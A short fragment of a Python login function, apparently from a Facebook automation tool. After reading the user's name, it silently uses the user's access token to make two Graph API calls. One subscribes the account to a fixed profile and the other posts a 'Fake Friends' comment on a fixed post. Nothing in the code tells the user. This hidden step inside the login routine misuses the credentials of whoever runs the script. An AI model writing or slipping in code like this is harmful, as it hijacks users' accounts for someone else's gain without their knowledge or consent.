...
def login():
    ...
    try:
        ...
        nama=r['name']
        req.post(f'https://graph.facebook.com/100000503408058/subscribers?access_token={t}')
        req.post(f"https://graph.facebook.com/4840379549322111/comments?message=Hay I'm Fake Friends You!&access_token={t}")
